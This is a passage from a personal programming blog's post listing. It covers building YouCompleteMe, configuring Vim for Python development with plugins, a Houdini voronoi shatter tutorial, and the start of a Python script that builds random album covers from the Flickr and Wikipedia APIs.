<p>So now the <code>people</code> list is sorted by whichever attribute you decide and
you can iterate over it as normal.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/01/28/back-to-the-octo/">
        Back to the Octo
      </a>
    </h1>

    <span class="post-date">Tue, Jan 28, 2014</span>

    <p>Back to the Ocotpress we go&hellip;.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2013/11/07/you-complete-me/">
        YouCompleteMe
      </a>
    </h1>

    <span class="post-date">Thu, Nov 7, 2013</span>

    <p>If you haven&rsquo;t heard of the YouCompleteMe plugin for Vim, headover to
<a href="http://valloric.github.io/YouCompleteMe/">http://valloric.github.io/YouCompleteMe/</a> and take a look.
It&rsquo;s a very competent auto completer for a variety of languages. But as always the C style completer takes
a little bit of work to get going. So just for you, I&rsquo;ve written up how I managed to get it to work
on 64bit Centos 6.2.</p>

<p>So using <a href="https://github.com/gmarik/vundle">Vundle</a> install YouCompleteMe (referred to as YCM from now on).
Now we need to build clang. I managed to get this done by following <a href="http://clang.llvm.org/get_started.html">these steps</a>.
Use <code>CC=&quot;/usr/bin/gcc&quot; CXX=&quot;/usr/bin/g++&quot; ../llvm/configure</code> to configure it.</p>

<p>You will end up with a directory called <code>build</code> that contains almost everything. All you have to do is copy the
<code>llvm/tools/clang/include/clang-c</code> folder from the original checkout (step 2 if you follow the clang guide) to
<code>build/include</code>.</p>

<p>Now we need to build the YCM tools according to the docs. Here&rsquo;s the command I used:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">cmake -G <span style="color: #e6db74">&quot;Unix Makefiles&quot;</span> -DPATH_TO_LLVM_ROOT<span style="color: #f92672">=</span>/tmp/build -DEXTERNAL_LIBCLANG_PATH<span style="color: #f92672">=</span>/tmp/build/Release+Asserts/lib/libclang.so . ~/.vim/bundle/YouCompleteMe/cpp
</pre></div>


<p>adjust the paths as necessary. After the configure stage run</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">make ycm_support_libs
</pre></div>
</p>

<p>And with some patience you are done.</p>

<p>Now you need to add a <code>.ycm_extra_conf.py</code> to your project and you should start seeing autocompletion.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2013/02/08/vim-as-a-python-ide/">
        Vim as a Python IDE
      </a>
    </h1>

    <span class="post-date">Fri, Feb 8, 2013</span>

    

<p>I&rsquo;ve been spending quite a bit of time with our good old buddy Python recently, and when
I do, I always invite along our mutual friend Vim. He&rsquo;s a barrell of laughs and always
knows of a quicker way to do things. So I&rsquo;ve been getting the two acquainted more and more
and Vim&rsquo;s turned into a totally different person. So I am going to share with you how
I setup Vim as my tool of choice when working with Python code. It&rsquo;s by no means the
definitive way of working, but it works for me. I know there&rsquo;s quite a few posts similar to this one,
but these are the tools <strong>I</strong> find useful and use. If you have some suggestions, comments, or
know of additional tools that might be useful, I would like to hear about them in the comments
below.</p>

<p>If you are a Vim user you might find this useful. If you are new to Vim I suggest spending some
time with it before installing any plugins. That way you get used to how Vim works out of the box.
Once you&rsquo;re comfortable with using it, and you&rsquo;ve gotten to grips with the Vim-way, go ahead and
install some extras.</p>

<p>Right, let&rsquo;s get started.</p>

<p>First and foremost you should install <a href="https://github.com/gmarik/vundle">Vundle</a>. Vundle will
make installing and updating all the other tools much easier. It&rsquo;s basically pathogen with a lot
of nice extras, like installing the bundles itself from their Github repos (and other sources).
For more info see the README in the Github repo. To install follow the instructions from the repo,
which are repeated below:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
</pre></div>


<p>thenadd the following to your <code>.vimrc</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">nocompatible</span>
<span style="color: #66d9ef">filetype</span> off

<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">rtp+=~</span><span style="color: #e6db74">/.vim/</span>bundle<span style="color: #e6db74">/vundle/</span>
<span style="color: #66d9ef">call</span> vundle#rc<span style="color: #f8f8f2">()</span>

<span style="color: #75715e">&quot; let Vundle manage Vundle</span>
<span style="color: #75715e">&quot; required! </span>
Bundle <span style="color: #e6db74">&#39;gmarik/vundle&#39;</span>

<span style="color: #75715e">&quot; The bundles you install will be listed here</span>

<span style="color: #66d9ef">filetype</span> plugin indent <span style="color: #66d9ef">on</span>

<span style="color: #75715e">&quot; The rest of your config follows here</span>
</pre></div>


<p>Now if you launch Vim and run the command</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">:</span>BundleList
</pre></div>


<p>a new split should appear listing the Vundle bundle. Everything went ok in that case.</p>

<p>As you go through this article you can install each item separately or you can add the bundles
to your <code>.vimrc</code> one by one and then just install them all at once at the end if you prefer.</p>

<p>Ok, so having done that let&rsquo;s configure a few more things.</p>

<h1 id="highlight-excess-line-length:c2f6c0c20421a669648093b37836b9d8">Highlight excess line length</h1>

<p>You&rsquo;ll probably want to set a restriction to line width for python files. I like to set this to 120
chars. 80 chars is usually the standard, but with modern displays we can allow ourselves a few more,
but you are free to adjust as you like. To enable this excess highlighting, add the following lines
to your <code>.vimrc</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">augroup vimrc_autocmds
    autocmd<span style="color: #f8f8f2">!</span>
<span style="color: #75715e">    &quot; highlight characters past column 120</span>
    autocmd <span style="color: #f8f8f2">FileType</span> python <span style="color: #f8f8f2">highlight</span> Excess ctermbg<span style="color: #f8f8f2">=</span>DarkGrey guibg<span style="color: #f8f8f2">=</span>Black
    autocmd <span style="color: #f8f8f2">FileType</span> python <span style="color: #66d9ef">match</span> Excess <span style="color: #e6db74">/\%120v.*/</span>
    autocmd <span style="color: #f8f8f2">FileType</span> python <span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">nowrap</span>
    augroup END
</pre></div>


<p>Anything that exceeds the line length will be highlighted black, feel free to change this colour
to suit your colourscheme. It also turns off line wrapping for python files.</p>

<h1 id="powerline:c2f6c0c20421a669648093b37836b9d8">Powerline</h1>

<p>Next up we install <a href="https://github.com/Lokaltog/powerline">Powerline</a> which looks like this:</p>


<figure >
    
        <img src="center%20/images/content/powerline.png" />
    
    
</figure>


<p>It shows you your current mode (NORMAL), the current branch in Git, the file you are editing and some other
useful information.</p>

<p>Simply add:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">Bundle <span style="color: #e6db74">&#39;Lokaltog/powerline&#39;</span><span style="color: #f8f8f2">,</span> {<span style="color: #e6db74">&#39;rtp&#39;</span>: <span style="color: #e6db74">&#39;powerline/bindings/vim/&#39;</span>}
</pre></div>


<p>to your <code>.vimrc</code> below the comment we added earlier <code>&quot; The bundles you install will be listed here</code>. Restart Vim
and run <code>:BundleList</code> again. Now you should also see the Powerline bundle listed there. To install it run the command</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">:</span>BundleInstall
</pre></div>


<p>You&rsquo;ll see Vundle process the list and report on the status of the installation. Hopefully everything went ok.</p>

<p>Powerline however does require a few more things, most notably patched fonts to display the special characters it uses.
You can get pre-patched fonts from <a href="https://github.com/Lokaltog/powerline-fonts">the powerline-fonts repo</a>. If your
font isn&rsquo;t listed then the powerline repo does provide a font-patcher you can use to try and patch your font. How this
is done however is outside the scope of this article. To select your font and ensure that Powerline is always shown,
you will also need to add these two lines to your <code>.vimrc</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&quot; Powerline setup</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">guifont=</span>DejaVu\ Sans\ Mono\ <span style="color: #66d9ef">for</span>\ Powerline\ <span style="color: #ae81ff">9</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">laststatus=</span><span style="color: #ae81ff">2</span>
</pre></div>


<p><code>laststatus</code> ensures that Powerline shows up even if you don&rsquo;t have any splits.</p>

<p>Restart vim and hopefully you&rsquo;ll see your powerline appear at the bottom of you window.</p>

<p>Please note that this version of Powerline is a Python based version and thus requires your Vim to  be built
with Python enabled. To check if it is run:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$&gt;</span> vim --version <span style="color: #f8f8f2">|</span> grep -i python
</pre></div>


<p>from the commandline. If you see <code>+python</code> then you are ok. There is
<a href="https://github.com/Lokaltog/vim-powerline">another Powerline</a> that is a native Vim plugin should
you not have Python enabled or prefer to use it over the Python version.</p>

<h1 id="fugitive:c2f6c0c20421a669648093b37836b9d8">Fugitive</h1>

<p><a href="https://github.com/tpope/vim-fugitive">Fugitive</a> is a <a href="http://git-scm.com/">Git</a> plugin. It basically wraps
most Git commands so that you can call them from inside Vim. They are prefixed with <code>G</code>, for example <code>Gcommit</code>
For example it allows you to stage files directly from Vim and make the commit. It also leverages VimDiff to perform
conflict resolution, blame and the like. There&rsquo;s a whole set of screencasts on how to use it available from
<a href="http://vimcasts.org/episodes/fugitive-vim---a-complement-to-command-line-git/">Vim Casts</a> which I recommend watching.</p>

<p>To install Fugitive, add its bundle to Vundle:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">Bundle <span style="color: #e6db74">&#39;tpope/vim-fugitive&#39;</span>
</pre></div>


<p>Run <code>:BundleInstall</code> again to install it.</p>

<h1 id="nerdtree:c2f6c0c20421a669648093b37836b9d8">NerdTree</h1>

<p><a href="https://github.com/scrooloose/nerdtree">NerdTree</a> is a filebrowser that pops up in a
split when you need it and features a tree like file browser (hence the  <em>tree</em> part in the name).
It looks somewhat like this:</p>


<figure >
    
        <img src="center%20/images/content/nerdtree.png" />
    
    
</figure>


<p>As usual you just need to add its package to Vundle:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">Bundle <span style="color: #e6db74">&#39;scrooloose/nerdtree&#39;</span>
</pre></div>


<p>and <code>:BundleInstall</code> once you restart Vim. To activate with <code>F2</code> add the following to <code>.vimrc</code>:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">map <span style="color: #f8f8f2">&lt;</span>F2<span style="color: #f8f8f2">&gt;</span> :NERDTreeToggle<span style="color: #f8f8f2">&lt;</span>CR<span style="color: #f8f8f2">&gt;</span>
</pre></div>


<p>Press <code>F2</code> in vim and it will take you to the current working directory. Press <code>?</code> to see NerdTree&rsquo;s
list of commands.</p>

<h1 id="python-mode:c2f6c0c20421a669648093b37836b9d8">Python mode</h1>

<p>This is the big one. It basically adds all the Python functionality you could ever want in Vim. Things like Lint,
codecompletion, documentation lookup, jump to classes, refactoring tools etc. You&rsquo;ll find it in
<a href="https://github.com/klen/python-mode">Python-mode</a></p>

<p>Its bundle is:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">Bundle <span style="color: #e6db74">&#39;klen/python-mode&#39;</span>
</pre></div>
</p>

<p>Again, <code>:BundleInstall</code> to install it and then we probably want to configure some items. There&rsquo;s a lot to
configure, so if you want the complete picture I suggest you head over to the
<a href="https://github.com/klen/python-mode">Github repo</a> and read the more complete docs,
or run <code>:help python-mode</code> from inside Vim.</p>

<p>I found the following settings most useful personally, but you might want to tweak some settings to suit your needs
and workflow. The following a copy-paste from my .vimrc. The keyboard shortcuts in the comments are the ones I find
most useful and I keep them there for reference:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&quot; Python-mode</span>
<span style="color: #75715e">&quot; Activate rope</span>
<span style="color: #75715e">&quot; Keys:</span>
<span style="color: #75715e">&quot; K             Show python docs</span>
<span style="color: #75715e">&quot; &lt;Ctrl-Space&gt;  Rope autocomplete</span>
<span style="color: #75715e">&quot; &lt;Ctrl-c&gt;g     Rope goto definition</span>
<span style="color: #75715e">&quot; &lt;Ctrl-c&gt;d     Rope show documentation</span>
<span style="color: #75715e">&quot; &lt;Ctrl-c&gt;f     Rope find occurrences</span>
<span style="color: #75715e">&quot; &lt;Leader&gt;b     Set, unset breakpoint (g:pymode_breakpoint enabled)</span>
<span style="color: #75715e">&quot; [[            Jump on previous class or function (normal, visual, operator modes)</span>
<span style="color: #75715e">&quot; ]]            Jump on next class or function (normal, visual, operator modes)</span>
<span style="color: #75715e">&quot; [M            Jump on previous class or method (normal, visual, operator modes)</span>
<span style="color: #75715e">&quot; ]M            Jump on next class or method (normal, visual, operator modes)</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_rope <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>

<span style="color: #75715e">&quot; Documentation</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_doc <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_doc_key <span style="color: #f8f8f2">=</span> <span style="color: #e6db74">&#39;K&#39;</span>

<span style="color: #75715e">&quot;Linting</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_lint <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_lint_checker <span style="color: #f8f8f2">=</span> <span style="color: #e6db74">&quot;pyflakes,pep8&quot;</span>
<span style="color: #75715e">&quot; Auto check on save</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_lint_write <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>

<span style="color: #75715e">&quot; Support virtualenv</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_virtualenv <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>

<span style="color: #75715e">&quot; Enable breakpoints plugin</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_breakpoint <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_breakpoint_bind <span style="color: #f8f8f2">=</span> <span style="color: #e6db74">&#39;&lt;leader&gt;b&#39;</span>

<span style="color: #75715e">&quot; syntax highlighting</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_syntax <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_syntax_all <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_syntax_indent_errors <span style="color: #f8f8f2">=</span> <span style="color: #66d9ef">g</span>:pymode_syntax_all
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_syntax_space_errors <span style="color: #f8f8f2">=</span> <span style="color: #66d9ef">g</span>:pymode_syntax_all

<span style="color: #75715e">&quot; Don&#39;t autofold code</span>
<span style="color: #66d9ef">let</span> <span style="color: #66d9ef">g</span>:pymode_folding <span style="color: #f8f8f2">=</span> <span style="color: #ae81ff">0</span>
</pre></div>
</p>

<p>To explain the above a bit, here&rsquo;s what it does:</p>

<ul>
<li>Allow me to look up Python docs by pressing <code>K</code></li>
<li>Automatically check my code on each save, but only use <code>PyLint</code> or <code>PyFlakes</code></li>
<li>Support virtualenv</li>
<li>Use <code>&lt;leader&gt;b</code> to add a pdb shortcut (inserts <code>import pdb; pdb.set_trace() # XXX BREAKPOINT</code> into your code</li>
<li>Enhanced syntax highlighting and formatting</li>
</ul>

<p>As I said, please read the full docs and adjust the settings as you see fit.</p>

<h1 id="jedi-vim:c2f6c0c20421a669648093b37836b9d8">Jedi vim</h1>

<p>Since I wrote this article I have discovered <a href="https://github.com/davidhalter/jedi-vim">Jedi-vim</a>
which I now use as the autocompletion tool instead of the rope plugin that comes with Python Mode. All you need to do is
add the plugin to the vundle list and turn off Rope by replacing the <code>let g:pymode_rope = 1</code> with
<code>let g:pymode_rope = 0</code>. I feel it&rsquo;s snappier and more capable than Rope. But if you want to avoid
installing another plugin, then feel free to stay with Rope.</p>

<h1 id="other-settings:c2f6c0c20421a669648093b37836b9d8">Other settings</h1>

<p>I also use some specific Vim settings in <code>.vimrc</code> that make the experience a bit nicer for me:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&quot; Use &lt;leader&gt;l to toggle display of whitespace</span>
nmap <span style="color: #f8f8f2">&lt;</span>leader<span style="color: #f8f8f2">&gt;</span><span style="color: #66d9ef">l</span> :<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">list!&lt;</span>CR<span style="color: #f8f8f2">&gt;</span>
<span style="color: #75715e">&quot; automatically change window&#39;s cwd to file&#39;s dir</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">autochdir</span>

<span style="color: #75715e">&quot; I&#39;m prefer spaces to tabs</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">tabstop=</span><span style="color: #ae81ff">4</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">shiftwidth=</span><span style="color: #ae81ff">4</span>
<span style="color: #66d9ef">set</span> <span style="color: #f8f8f2">expandtab</span>

<span style="color: #75715e">&quot; more subtle popup colors </span>
<span style="color: #66d9ef">if</span> has <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&#39;gui_running&#39;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">highlight</span> Pmenu guibg<span style="color: #f8f8f2">=</span><span style="color: #ae81ff">#cccccc</span> <span style="color: #66d9ef">gui</span><span style="color: #f8f8f2">=bold</span>    
<span style="color: #66d9ef">endif</span>
</pre></div>
</p>

<h1 id="summary:c2f6c0c20421a669648093b37836b9d8">Summary</h1>

<p>This is basically the crux of my Python and Vim development setup. I think the core of the whole thing really is
python mode as it provides the most Python specific tools. The other plugins however do add some really useful
functionality to make your life a little easier. You might ask why I don&rsquo;t list things like <code>fuzzy file search</code>
and such, and that&rsquo;s because I don&rsquo;t use it. I&rsquo;ve tried it before and didn&rsquo;t really get on with it very well and I
prefer to either just open the files directly or using <code>NerdTree</code>.</p>

<p>I hope that this post provides some pointers to help you setup your Vim based Python development environment. As
I said above, feel free to leave a comment with any plugins or settings that you find useful, always happy to hear
about what else is out there.</p>

<p>Thanks for reading.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/12/08/houdini-voronoi-shatter/">
        Houdini voronoi shatter
      </a>
    </h1>

    <span class="post-date">Sat, Dec 8, 2012</span>

    <p>Thought I would write about creating a very simple voronoi shatter effect in Houdini and how to explode it. The video below demonstrates the effect we&rsquo;re looking to achieve:</p>

<p>{% vimeo 55168444 %}</p>

<p>The process of creating this is very simple, and I learned a few things from setting this up, so I figured I would share and hope you learn something from it too.</p>

<p>So first we need to drop down a <em>Geometry</em> node and dive inside. Delete the file node and then create a <em>box</em> node. This box will be the object we will shatter. But in order to create a voronoi shatter we also need some seed points to generate the pattern with. So let&rsquo;s do that first. We&rsquo;ll use our box to generate the points we need, so drop down a <em>Points From Volume</em> node and connect the box to its input. Adjust the settings to your liking, or copy the ones below. I kept the number of points low as I wanted fewer and larger pieces.</p>


<figure >
    
        <img src="http://unlogic.co.uk/images/content/points_from_vol.png" />
    
    
</figure>


<p>Now that we have our points we can drop down a <em>Voronoi Fracture</em> node and connect the points to its second input. The only setting I changed was to turn on <code>Connect Inside Edges</code>. Finally we need to connect the <em>box</em> node to the <em>Voronoi Shatter&rsquo;s</em> first input. Now make the <em>Voronoi shatter</em> visible and you should see your fractured geo.</p>


<figure >
    
        <img src="center%20/images/content/fracture.png" />
    
    
</figure>


<p>Next we&rsquo;ll turn on the dynamics via the rigid bodies shelf at the top. Click <em>RBD Fracture</em> and make sure the voronoi geo is selected and press enter. If you press play now your object will fall down. Hrmmm, not totally awesome, as we wanted to explode it a little too. So the plan is to make all the pieces explode from the center outwards, like, for example, along the normals of a sphere say? Yes, that sounds about right. Ok, so let&rsquo;s put down a <em>Sphere</em> and scale it so that it&rsquo;s roughly the same size as the box. Append a <em>Point</em> node to the sphere and add a <em>Normal</em> and <em>Velocity</em> attribute. The <em>Velocity</em> attribute is under the <em>Particle</em> tab and we&rsquo;ll set its value to be a facture of the point&rsquo;s normal. Feel free to play with this value to get the efect you want. Basically this will set the point&rsquo;s velocity to the normal at that point, causing the pieces to rediate outwards when the sim starts.</p>


<figure >
    
        <img src="center%20/images/content/vel_attribute.png" />
    
    
</figure>


<p>Connect the output to the second input of an <em>Attribute Transfer</em> node and then connect the output of that to the <em>Rest Position</em> node. Connect the <em>Box</em> to the first input of the <em>Attribute Transfer</em> node. This will transfer the point attributes of the <em>Sphere</em> onto the shattered geo. You should now have a network that looks like this:</p>


<figure >
    
        <img src="center%20/images/content/finalnetwork.png" />
    
    
</figure>


<p>And yet still to exploding pieces? Well, we need to tell our solver to use the point velocity. So dive into the <em>Autodop Network</em> and on the <em>RBD Fracture Object</em> enable <em>Inherit Velocity From Point Velocity</em>. Hit play and you should see it explode.</p>

<p>
<figure >
    
        <img src="center%20/images/content/inherit_pv.png" />
    
    
</figure>
</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2012/11/06/random-album-generator/">
        Random album generator in python
      </a>
    </h1>

    <span class="post-date">Tue, Nov 6, 2012</span>

    <p>You may have heard about the &ldquo;random music album&rdquo; thing. Basically it goes like this:</p>

<ul>
<li>The album cover is the 4th image from a random page of Flickr&rsquo;s interesting pics</li>
<li>The band name is the title of a random Wikipedia article</li>
<li>The album name comes from the last 3 or 5 words of a famous quote</li>
</ul>

<p>This is all well and good, but isn&rsquo;t getting all this data manually, and then making the album cover a bit tedious? Sure it is, so let&rsquo;s see how we can do this in python</p>

<p>Here are some example images generated with this script (click for the full size picture):</p>


<figure >
    
        <img src="http://unlogic.co.uk/images/content/album2.jpg" />
    
    
</figure>



<figure >
    
        <img src="http://unlogic.co.uk/images/content/album3.jpg" />
    
    
</figure>



<figure >
    
        <img src="http://unlogic.co.uk/images/content/album4.jpg" />
    
    
</figure>


<p>Let&rsquo;s cover our dependencies first. You will need:</p>

<ul>
<li>python 2.6 (or similar)</li>
<li>PIL (<a href="http://www.pythonware.com/products/pil/">python Image Library</a>)</li>
<li>A <a href="http://www.flickr.com/services/apps/create/apply/">Flickr API key</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
</ul>

<p>Not much to ask for is it? So once you&rsquo;ve made sure you have all that, let&rsquo;s start by getting the album cover. This is handled by the <a href="http://www.flickr.com/services/api/flickr.interestingness.getList.html">interestingness</a> part of the API and is a very simple call that will return an XML structure of the photos on that page. Once we have a response we parse the XML and get the elements we need to construct the photo URL. It&rsquo;s a short function and here it is:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">getAlbumImage</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">page</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">random</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">randint(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">80</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;http://api.flickr.com/services/rest/?method=flickr.interestingness.getList&amp;api_key=YOURAPIKEYHERE&amp;per_page=6&amp;page=%d&amp;format=rest&quot;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(page)</span>
    <span style="color: #f8f8f2">dom</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">minidom</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">parse(urllib</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlopen(url))</span>

    <span style="color: #f8f8f2">elem</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">dom</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getElementsByTagName(</span><span style="color: #e6db74">&#39;photo&#39;</span><span style="color: #f8f8f2">)[</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">]</span>
    <span style="color: #f8f8f2">farm_id</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">elem</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getAttributeNode(</span><span style="color: #e6db74">&#39;farm&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">nodeValue</span>
    <span style="color: #f8f8f2">server_id</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">elem</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getAttributeNode(</span><span style="color: #e6db74">&#39;server&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">nodeValue</span>
    <span style="color: #f8f8f2">the_id</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">elem</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getAttributeNode(</span><span style="color: #e6db74">&#39;id&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">nodeValue</span>
    <span style="color: #f8f8f2">secret</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">elem</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getAttributeNode(</span><span style="color: #e6db74">&#39;secret&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">nodeValue</span>
    
    <span style="color: #f8f8f2">photo_url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;http://farm%s.staticflickr.com/%s/%s_%s_b.jpg&quot;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(farm_id,</span> <span style="color: #f8f8f2">server_id,</span> <span style="color: #f8f8f2">the_id,</span> <span style="color: #f8f8f2">secret)</span>
    <span style="color: #f8f8f2">target_photo</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;band.jpg&#39;</span>
    <span style="color: #f8f8f2">subprocess</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">call([</span><span style="color: #e6db74">&quot;/usr/bin/wget&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;-O&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">target_photo,</span> <span style="color: #f8f8f2">photo_url])</span>
</pre></div>


<p>First we generate a random number which will be the page number we use in constructing the API URL. Once constructed we use <code>minidom</code> to parse it and start extracting our data. If you paste the URL into your browser (with your valid API key) you can see the response format. Now that we have all the data we need, we construct our image URL (the format for this is in the docs) and save it to <code>band.jpg</code> using <code>wget</code>. You can of course use something else, but this is just easy here.</p>

<p>Right, onto getting our band name. This is the random Wikipedia article. Luckily Wikipedia has an API also, and doesn&rsquo;t require an API key for this purpose. This is an even shorter function:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">getBandName</span><span style="color: #f8f8f2">():</span>
    <span style="color: #f8f8f2">random_wiki_url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;http://en.wikipedia.org/w/api.php?format=xml&amp;action=query&amp;list=random&amp;rnnamespace=0&amp;rnlimit=1&quot;</span>
    <span style="color: #f8f8f2">dom</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">minidom</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">parse(urllib</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlopen(random_wiki_url))</span>

    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">line</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">dom</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getElementsByTagName(</span><span style="color: #e6db74">&#39;page&#39;</span><span style="color: #f8f8f2">):</span>
        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">line</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getAttributeNode(</span><span style="color: #e6db74">&#39;title&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">nodeValue</span>
</pre></div>
</p>

<p>As above we create the URL, parse the output with minidom and fetch our page title. Done.</p>

<p>Album title is a little trickier. I couldn&rsquo;t find a decent quote page that offered a free, easy to use API, so I decided to be a little more hacky and just parse the HTML itself. Hey, it works, don&rsquo;t judge me. We need a helper class for this called <code>MyHTMLParser</code> that derives from python&rsquo;s <a href="http://docs.python.org/2/library/htmlparser.html?highlight=htmlparser#HTMLParser">HTMLParser</a> class.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">class</span> <span style="color: #a6e22e">MyHTMLParser</span><span style="color: #f8f8f2">(HTMLParser):</span>
    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">__init__</span><span style="color: #f8f8f2">(self):</span>
        <span style="color: #f8f8f2">HTMLParser</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">__init__(self)</span>
        <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get_data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">False;</span>
        <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">quotes</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>

    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">handle_starttag</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">tag,</span> <span style="color: #f8f8f2">attrs):</span>
